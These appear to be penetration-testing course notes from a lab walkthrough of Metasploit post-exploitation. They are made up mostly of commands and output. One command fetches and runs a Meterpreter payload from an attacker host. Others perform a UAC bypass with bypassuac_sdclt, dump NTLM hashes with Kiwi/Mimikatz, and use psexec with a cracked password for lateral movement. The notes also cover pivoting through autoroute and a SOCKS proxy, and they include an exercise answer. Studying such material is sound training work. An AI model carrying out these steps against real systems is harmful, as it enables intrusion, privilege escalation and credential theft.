C:\Users\luiza>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\luiza> iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
PS C:\Users\luiza> .\met.exe
.\met.exe
PS C:\Users\luiza>
```

Return to our multi/handler.
```
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jimautmn) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv6akQZS5QF6abQAzzv1_zbwDs87CcrIqLIzvflY5i with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jimautmn) Attaching orphaned/stageless session...
[*] Meterpreter session 2 opened (192.168.45.182:443 -> 192.168.226.223:52525) at 2023-11-23 12:08:20 -0800

meterpreter > getsystem
[-] Error running command getsystem: Rex::TimeoutError Send timed out
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps

Process List
============

 PID   PPID  Name           Arch  Session  User                   Path
 ---   ----  ----           ----  -------  ----                   ----
...
 7092  5292  OneDrive.exe   x64   1        ITWK01\offsec          C:\Users\offsec\AppDa
                                                                  ta\Local\Microsoft\On
                                                                  eDrive\OneDrive.exe
...

meterpreter > migrate 7092
[*] Migrating from 4876 to 7092...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ITWK01\offsec
```
- We are now running in the context of `offsec`

While this is an admin account, UAC prevents us from performing admin ops as we learned in prior modules.  Before attempting UAC bypass, confirm that the current proc has integrity level Medium.

To diplay the integrity level of a proc, we can use tools such as [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) or 3rd-party PowerShell modules such as [NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.1.33).  Assume the later is installed on the system already.

Once we import the module with [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) we use `Get-NtTokenIntegrityLevel` to display the integrity level of the current proc by retrieving and reviewing the assigned access token.
```
meterpreter > shell
Process 1512 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
```
- We are operating in the context of integrity level Medium.

Next we background the currently active channel and session to search for UAC post modules to leverage.
```
PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y
meterpreter > bg
[*] Backgrounding session 2...
```

Search for UAC bypass modules.
```
msf6 exploit(multi/handler) > search UAC

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   post/windows/manage/sticky_keys                                         normal     No     Sticky Keys Persistence Module
   1   exploit/windows/local/cve_2022_26904_superprofile      2022-03-17       excellent  Yes    User Profile Arbitrary Junction Creation Local Privilege Elevation
   2   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   3   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
   4   exploit/windows/local/ask                              2012-01-03       excellent  No     Windows Escalate UAC Execute RunAs
   5   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   6   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   7   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   8   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
   9   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   10  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   11  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   12  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   13  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   14  post/windows/gather/win_privs                                           normal     No     Windows Gather Privileges Enumeration
   15  exploit/windows/local/tokenmagic                       2017-05-25       excellent  Yes    Windows Privilege Escalation via TokenMagic (UAC Bypass)
   16  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   17  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)


Interact with a module by name or index. For example info 17, use 17 or use exploit/windows/local/bypassuac_sluihijack
```
- The search yields a few results.
 - And effective UAC bypass on moder Win sys is `exploit/windows/local/bypassuac_sdclt`
  - Targets the MS bin `sdclt.exe`
  - Can bypass UAC by spawning a proc with integrity level High.

To use the mod we activate it and set the `SESSION` and `LHOST` options.  Setting the SESSION for a post mod allows us to directly exec the exploit on the active session.  Enter `run` to launch the module.
```
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_sdclt) > show options 

Module options (exploit/windows/local/bypassuac_sdclt):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PAYLOAD_NAME                   no        The filename to use for the payload binary
                                            (%RAND% by default).
   SESSION                        yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, proc
                                        ess, none)
   LHOST     192.0.2.113   yes       The listen address (an interface may be specifi
                                        ed)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_sdclt) > sessions 

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  2         meterpreter x64/windows  ITWK01\offsec @ ITWK01  192.168.45.182:443 -> 192.
                                                             168.226.223:52525 (192.168
                                                             .226.223)

msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.45.182
LHOST => 192.168.45.182
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on 192.168.45.182:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\pnDeecwth.exe'
[*] Please wait for session and cleanup....
[*] Sending stage (200774 bytes) to 192.168.226.223
[*] Meterpreter session 3 opened (192.168.45.182:4444 -> 192.168.226.223:52784) at 2023-11-23 12:57:32 -0800
[*] Registry Changes Removed

meterpreter >
```
- Our UAC bypass post module created a new Meterpreter session.

Let's check the integrity level of the proc as we did before.
```
meterpreter > shell
Process 7540 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High
```
- The proc of our payload runs in has the integrity level High and we have therefore bypassed UAC.

Besides being able to BG the active session and execute module through it, we can load modules through it, we can also load extensions directly inside the active session with the `load` command.

A great example is Kiwi, which is a Meterpreter extension providing Mimikatz capabilities.  Mimikatz requires SYSTEM, let's exit the current Meterpreter session, start the listener again, and exe `met.exe` as user `luiza` in the bind shell then enter `getsystem`.
```
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv6VIASGBxRp7RwO4XlsjMBusd6IdD5_5n82-Fzhm5 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
[*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: jzbq1suw) Attaching orphaned/stageless session...
[*] Meterpreter session 4 opened (192.168.45.182:443 -> 192.168.226.223:52810) at 2023-11-23 13:05:09 -0800

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

Enter `load` with `kiwi` as arg to load the Kiwi mod and use `help` to display the commands of the Kiwi module.  Use `creds_msv` to retrieve LM and NTLM creds.
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > help

...


Kiwi Commands
=============

    Command       Description
    -------       -----------
    creds_all     Retrieve all credentials (parsed)
    creds_kerber  Retrieve Kerberos creds (parsed)
    os
    creds_livess  Retrieve Live SSP creds
    p
    creds_msv     Retrieve LM/NTLM creds (parsed)
    creds_ssp     Retrieve SSP creds
    creds_tspkg   Retrieve TsPkg creds (parsed)
    creds_wdiges  Retrieve WDigest creds (parsed)
    t
    dcsync        Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm   Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticke  Create a golden kerberos ticket
    t_create
    kerberos_tic  List all kerberos tickets (unparsed)
    ket_list
    kerberos_tic  Purge any in-use kerberos tickets
    ket_purge
    kerberos_tic  Use a kerberos ticket
    ket_use
    kiwi_cmd      Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam  Dump LSA SAM (unparsed)
    lsa_dump_sec  Dump LSA secrets (unparsed)
    rets
    password_cha  Change the password/hash of a user
    nge
    wifi_list     List wifi profiles/creds for the current user
    wifi_list_sh  List shared wifi profiles/creds (requires SYSTEM)
    ared

meterpreter > creds_msv 
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a
                                                    0d837
offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd
                                                    80bbd
```
- We successfully retrieve the NTLM has of `luiza`

###### Exercises

Follow the steps from this section and use Kiwi to retrieve the NTLM hash of user offsec. Enter it as answer to this question.
```
1c3fb240ae45a2dc5951a043cf47040e
```

Search for a post-exploitation module that enumerates the Windows Hosts file and launch it against an active session on VM #1. What is the domain name of the only entry of this file?
```
msf6 exploit(multi/handler) > search type:post host

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank    Check  Description
   -   ----                                                         ---------------  ----    -----  -----------
   0   post/windows/gather/credentials/aim                                           normal  No     Aim credential gatherer
   1   post/linux/busybox/set_dmz                                                    normal  No     BusyBox DMZ Configuration
   2   post/linux/busybox/set_dns                                                    normal  No     BusyBox DNS Configuration
   3   post/linux/busybox/enum_hosts                                                 normal  No     BusyBox Enumerate Host Names
   4   post/windows/gather/credentials/chrome                                        normal  No     Chrome credential gatherer
   5   post/windows/gather/credentials/comodo                                        normal  No     Comodo credential gatherer
   6   post/windows/gather/credentials/coolnovo                                      normal  No     Coolnovo credential gatherer
   7   post/windows/gather/credentials/thycotic_secretserver_dump   2022-08-15       manual  No     Delinea Thycotic Secret Server Dump
   8   post/windows/gather/credentials/digsby                                        normal  No     Digsby credential gatherer
   9   post/windows/manage/execute_dotnet_assembly                                   normal  No     Execute .net Assembly (x64 only)
   10  post/windows/gather/credentials/flock                                         normal  No     Flock credential gatherer
   11  post/windows/manage/forward_pageant                                           normal  No     Forward SSH Agent Requests To Remote Pageant
   12  post/windows/gather/credentials/gadugadu                                      normal  No     Gadugadu credential gatherer
   13  post/multi/gather/aws_ec2_instance_metadata                                   normal  No     Gather AWS EC2 Instance Metadata
   14  post/multi/gather/minio_client                                                normal  No     Gather MinIO Client Key
   15  post/windows/gather/credentials/icq                                           normal  No     ICQ credential gatherer
   16  post/windows/gather/credentials/ie                                            normal  No     Ie credential gatherer
   17  post/windows/gather/credentials/incredimail                                   normal  No     Incredimail credential gatherer
   18  post/windows/gather/credentials/kakaotalk                                     normal  No     KakaoTalk credential gatherer
   19  post/windows/gather/credentials/kmeleon                                       normal  No     Kmeleon credential gatherer
   20  post/windows/gather/credentials/line                                          normal  No     LINE credential gatherer
   21  post/linux/gather/tor_hiddenservices                                          normal  No     Linux Gather TOR Hidden Services
   22  post/windows/gather/credentials/maxthon                                       normal  No     Maxthon credential gatherer
   23  post/windows/gather/credentials/miranda                                       normal  No     Miranda credential gatherer
   24  post/multi/gather/dns_bruteforce                                              normal  No     Multi Gather DNS Forward Lookup Bruteforce
   25  post/multi/gather/dns_srv_lookup                                              normal  No     Multi Gather DNS Service Record Lookup Scan
   26  post/multi/gather/ssh_creds                                                   normal  No     Multi Gather OpenSSH PKI Credentials Collection
   27  post/multi/gather/resolve_hosts                                               normal  No     Multi Gather Resolve Hosts
   28  post/multi/manage/zip                                                         normal  No     Multi Manage File Compressor
   29  post/multi/manage/autoroute                                                   normal  No     Multi Manage Network Route via Meterpreter Session
   30  post/linux/gather/enum_nagios_xi                             2018-04-17       normal  No     Nagios XI Enumeration
   31  post/windows/gather/credentials/opera                                         normal  No     Opera credential gatherer
   32  post/windows/gather/credentials/operamail                                     normal  No     Operamail credential gatherer
   33  post/windows/gather/credentials/postbox                                       normal  No     Postbox credential gatherer
   34  post/windows/gather/enum_putty_saved_sessions                                 normal  No     PuTTY Saved Sessions Enumeration Module
   35  post/windows/gather/credentials/qq                                            normal  No     QQ credential gatherer
   36  post/windows/gather/credentials/redis_desktop_manager                         normal  No     RedisDesktopManager credential gatherer
   37  post/multi/recon/reverse_lookup                                               normal  No     Reverse Lookup IP Addresses
   38  post/windows/gather/credentials/safari                                        normal  No     Safari credential gatherer
   39  post/multi/gather/saltstack_salt                                              normal  No     SaltStack Salt Information Gatherer
   40  post/windows/gather/credentials/seamonkey                                     normal  No     Seamonkey credential gatherer
   41  post/windows/gather/credentials/solarwinds_orion_dump        2022-11-08       manual  No     SolarWinds Orion Secrets Dump
   42  post/windows/gather/credentials/srware                                        normal  No     Srware credential gatherer
   43  post/windows/gather/credentials/tango                                         normal  No     Tango credential gatherer
   44  post/windows/gather/credentials/thunderbird                                   normal  No     Thunderbird credential gatherer
   45  post/windows/gather/credentials/tlen                                          normal  No     Tlen credential gatherer
   46  post/linux/gather/vcenter_secrets_dump                       2022-04-15       normal  No     VMware vCenter Secrets Dump
   47  post/windows/gather/credentials/veeam_credential_dump        2022-11-22       manual  No     Veeam Backup and Replication Credentials Dump
   48  post/windows/gather/credentials/viber                                         normal  No     Viber credential gatherer
   49  post/windows/gather/credentials/whatsupgold_credential_dump  2022-11-22       manual  No     WhatsUp Gold Credentials Dump
   50  post/windows/escalate/droplnk                                                 normal  No     Windows Escalate SMB Icon LNK Dropper
   51  post/windows/gather/enum_ad_computers                                         normal  No     Windows Gather Active Directory Computers
   52  post/windows/gather/credentials/credential_collector                          normal  No     Windows Gather Credential Collector
   53  post/windows/gather/enum_domains                                              normal  No     Windows Gather Domain Enumeration
   54  post/windows/gather/credentials/dyndns                                        normal  No     Windows Gather DynDNS Client Password Extractor
   55  post/windows/gather/enum_emet                                                 normal  No     Windows Gather EMET Protected Paths
   56  post/windows/gather/enum_domain_users                                         normal  No     Windows Gather Enumerate Active Domain Users
   57  post/windows/gather/exchange                                                  normal  No     Windows Gather Exchange Server Mailboxes
   58  post/windows/gather/local_admin_search_enum                                   normal  No     Windows Gather Local Admin Search
   59  post/windows/gather/smart_hashdump                                            normal  No     Windows Gather Local and Domain Controller Account Password Hashes
   60  post/windows/gather/enum_trusted_locations                                    normal  No     Windows Gather Microsoft Office Trusted Locations
   61  post/windows/gather/word_unc_injector                                         normal  No     Windows Gather Microsoft Office Word UNC Path Injector
   62  post/windows/gather/enum_proxy                                                normal  No     Windows Gather Proxy Setting
   63  post/windows/gather/credentials/razorsql                                      normal  No     Windows Gather RazorSQL Credentials
   64  post/windows/gather/credentials/rdc_manager_creds                             normal  No     Windows Gather Remote Desktop Connection Manager Saved Password Extraction
   65  post/windows/gather/wmic_command                                              normal  No     Windows Gather Run WMIC Commands
   66  post/windows/gather/screen_spy                                                normal  No     Windows Gather Screen Spy
   67  post/windows/gather/usb_history                                               normal  No     Windows Gather USB Drive History
   68  post/windows/gather/enum_hostfile                                             normal  No     Windows Gather Windows Host File Enumeration
   69  post/windows/gather/enum_hyperv_vms                                           normal  No     Windows Hyper-V VM Enumeration
   70  post/windows/gather/credentials/windowslivemail                               normal  No     Windows Live Mail credential gatherer
   71  post/windows/manage/change_password                                           normal  No     Windows Manage Change Password
   72  post/windows/manage/remove_host                                               normal  No     Windows Manage Host File Entry Removal
   73  post/windows/manage/inject_host                                               normal  No     Windows Manage Hosts File Injection
   74  post/windows/manage/pxeexploit                                                normal  No     Windows Manage PXE Exploit Server
   75  post/windows/manage/persistence_exe                                           normal  No     Windows Manage Persistent EXE Payload Installer
   76  post/windows/manage/priv_migrate                                              normal  No     Windows Manage Privilege Based Process Migration
   77  post/windows/manage/ie_proxypac                                               normal  No     Windows Manage Proxy PAC File
   78  post/windows/manage/clone_proxy_settings                                      normal  No     Windows Manage Proxy Setting Cloner
   79  post/windows/gather/netlm_downgrade                                           normal  No     Windows NetLM Downgrade Attack
   80  post/windows/manage/killav                                                    normal  No     Windows Post Kill Antivirus and Hips
   81  post/windows/recon/computer_browser_discovery                                 normal  No     Windows Recon Computer Browser Discovery
   82  post/windows/gather/credentials/xchat                                         normal  No     Xchat credential gatherer


Interact with a module by name or index. For example info 82, use 82 or use post/windows/gather/credentials/xchat

msf6 exploit(multi/handler) > use 68
msf6 post(windows/gather/enum_hostfile) > show options 

Module options (post/windows/gather/enum_hostfile):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_hostfile) > sessions 

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  4         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.45.182:443 -> 192.1
                                                            68.226.223:52810 (192.168.2
                                                            26.223)

msf6 post(windows/gather/enum_hostfile) > set SESSION 4
SESSION => 4
msf6 post(windows/gather/enum_hostfile) > run

Found entries:
[+] 10.10.10.10       secretstaging-internal.com
[*] Hosts file saved: /root/.msf4/loot/20231123131653_execpayloads_192.168.226.223_hosts.confige_445601.txt
[*] Post module execution completed
```


##### Pivoting with Metasploit

The ability to pivot from on target to another is vital.  In Port Redirection and Pivoting, we learned several techniques for pivoting.  Instead of perform these manually, we can also use Metasploit to perform them.

As we did previously, we'll connect to a bind shell on port 4444 of machine ITWK01.  Assume we are currently gathering info on the target, we identify a second network interface.
```
┌──(operator@labhost)-[~/OffSec/msf]
└─$ nc $IT 4444
Microsoft Windows [Version 10.0.22000.1219]
(c) Microsoft Corporation. All rights reserved.

C:\Users\luiza>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::45fb:788e:6d57:159e%11
   IPv4 Address. . . . . . . . . . . : 192.168.247.223
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.247.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::70ac:1479:11e0:d2a3%14
   IPv4 Address. . . . . . . . . . . : 172.16.132.199
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```
- The second interface has IP `172.16.132.199` assigned.

We can attempt to identify live hosts on this second iface leveraging methods from active information gathering.  Before doing so let's start a Meterpreter shell on our compromised host by downloading and executing `met.exe` as well as starting the multi/handler.
```
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.45.182:443
[*] https://192.168.45.182:443 handling request from 192.168.247.223; (UUID: q6ffomjo) Redirecting stageless connection from /rFTB8XlDRXgroSqjTsA9yAxl-Rd31X4pw0cV3II1NImcjbQA7wGIuTvM4SOR3pRu_9wlTX8LwansO4JRsNRtn1YKKF9PhqUVjbcYB_or57QB7yt1T4bf2b8Au with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
[*] https://192.168.45.182:443 handling request from 192.168.247.223; (UUID: q6ffomjo) Attaching orphaned/stageless session...
[*] Meterpreter session 5 opened (192.168.45.182:443 -> 192.168.247.223:52558) at 2023-11-24 13:33:08 -0800

meterpreter >
```

Now that we have a session on the target sys, we can background it.  To add a route to a network reachable through a compromised host we use `route add` with the network information and session ID the route applies to.  After adding the route we can display routes with `route print`.
```
meterpreter > bg
[*] Backgrounding session 5...
msf6 exploit(multi/handler) > route add 172.16.132.0/24 5
[*] Route added
msf6 exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.132.0       255.255.255.0      Session 5

[*] There are currently no IPv6 routes defined.
```
- With a path to the internal subnet we can enumerate.

We could scan the the whole network for live hosts with a port scan aux mod.  This would take some time to complete so we will shorted this step by scanning the only live host in the second network.  Instead of setting the value of `RHOSTS` to `172.16.132.0/24` as we would when scanning the whole network, we will set it to `172.16.132.200`.  For now we will only scan ports 445 and 3389.
```
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.132.200
RHOSTS => 172.16.132.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.132.200:       - 172.16.132.200:445 - TCP OPEN
[+] 172.16.132.200:       - 172.16.132.200:3389 - TCP OPEN
[*] 172.16.132.200:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
- Shows that 172.16.132.200 has ports 445 and 3389 open.
- Let's use two mods for SMB and RDP using out pivot host ITWK01 to perform operations on the target.

First we use psexec mod to get access to the second target as `luiza`.  Previously we retrieved NTLM hash via Kiwi, assume we cracked it and retrieved the clear text password `BoccieDearAeroMeow1!`.  For psexec to succeed `luiza` must be local admin on the second machine.  For the example, assume we confirmed that through information gathering.

Let's us `exploit/windows/smb/psexec` and set `SMBUser` to `luiza`, `SMBPass` to `BoccieDearAeroMeow1!`, and `RHOSTS` to `172.16.132.200`.

Note that the added route will only work with established connections, so the new shell on the target must be a bind shell such as `windows/x64/meterpreter/bind_tcp` allowing us to use the set route to connect to it.  A reverse shell payload would not be able to route back to our attacking sys because the target does not have a route defined for our network.
```
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS                                yes       The target host(s), see https://docs
                                                   .metasploit.com/docs/using-metasploi
                                                   t/basics/using-metasploit.html
   RPORT                445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                   no        Service description to be used on ta
                                                   rget for pretty listing
   SERVICE_DISPLAY_NAM                   no        The service display name
   E
   SERVICE_NAME                          no        The service name
   SMBDomain            .                no        The Windows domain to use for authen
                                                   tication
   SMBPass                               no        The password for the specified usern
                                                   ame
   SMBSHARE                              no        The share to connect to, can be an a
                                                   dmin share (ADMIN$,C$,...) or a norm
                                                   al read/write folder share
   SMBUser                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proc
                                        ess, none)
   LHOST     192.0.2.113   yes       The listen address (an interface may be specifi
                                        ed)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.132.200
RHOSTS => 172.16.132.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.45.182
LHOST => 192.168.45.182
```

With our options set we can launch the module.
```
msf6 exploit(windows/smb/psexec) > run

[*] 172.16.132.200:445 - Connecting to the server...
[*] 172.16.132.200:445 - Authenticating to 172.16.132.200:445 as user 'luiza'...
[*] 172.16.132.200:445 - Selecting PowerShell target
[*] 172.16.132.200:445 - Executing the payload...
[+] 172.16.132.200:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 172.16.132.200:8000
[*] Sending stage (200774 bytes) to 172.16.132.200
[*] Meterpreter session 6 opened (172.16.132.199:52880 -> 172.16.132.200:8000 via session 5) at 2023-11-24 14:56:33 -0800

meterpreter >
```
- Psexec exploit succeeded in obtaining a Meterpreter shell on the second target via the compromised machine.

An alternative to adding routes manually is to use the post mod `autoroute` to setup a pivot through an existing Meterpreter session automatically.  To demonstrate, we first need to remove the route we set manually.  Let's terminate the session created through the psexec module and remove all routes with `route flush`.

Now the only session is the Meterpreter session created with `met.exe` as user `luiza`.  The result of `route print` states that no routes are defined.  Next we activate mod `multi/manage/autoroute` in which we have to set the session ID as value for the option `SESSION`, then `run` to launch the module.
```
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, au
                                       toadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24
                                       "
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  5         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.45.182:443 -> 192.1
                                                            68.247.223:52558 (192.168.2
                                                            47.223)

msf6 post(multi/manage/autoroute) > set session 5
session => 5
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against ITWK01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.132.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.247.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route print 

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.132.0       255.255.255.0      Session 5
   192.168.247.0      255.255.255.0      Session 5

[*] There are currently no IPv6 routes defined.
```
- Shows autoroute added 172.16.132.0/24 to routing table.

We can now use the psexec module as we did before, we can also combine routes with the `server/socks_proxy` aux mod to configure a SOCKS proxy.  This allows applications outside of MSF to tunnel through the pivot on port 1080 by default.  Set the option `SRVHOST` to `127.0.0.1` and `VERSION` to `5` for SOCKS5.
```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on
                                       . This must be an address on the local machine o
                                       r 0.0.0.0 to listen on all addresses.
   SRVPORT  1080             yes       The port to listen on
   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)


   When VERSION is 5:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   USERNAME                   no        Proxy username for SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

